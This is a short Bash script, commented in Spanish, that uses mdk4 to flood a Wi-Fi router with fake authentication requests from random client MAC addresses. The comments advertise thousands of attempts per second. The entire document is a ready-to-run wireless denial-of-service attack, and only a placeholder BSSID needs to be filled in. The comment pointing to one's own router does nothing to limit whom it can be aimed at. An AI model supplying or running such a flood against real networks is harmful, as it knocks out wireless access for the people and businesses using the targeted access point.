#!/bin/bash
# AUTH_NUCLEAR.sh - Saturación por autenticaciones falsas

INTERFAZ="wlan0mon"
BSSID="AA:BB:CC:DD:EE:FF"  # MAC DE TU ROUTER

echo "⚡ ATAQUE DE AUTENTICACIÓN MASIVA"
echo "El router procesará miles de intentos falsos por segundo"

# -a = ataque de autenticación
# -c = cliente MAC aleatorio por cada intento
sudo mdk4 $INTERFAZ a -a $BSSID -c -m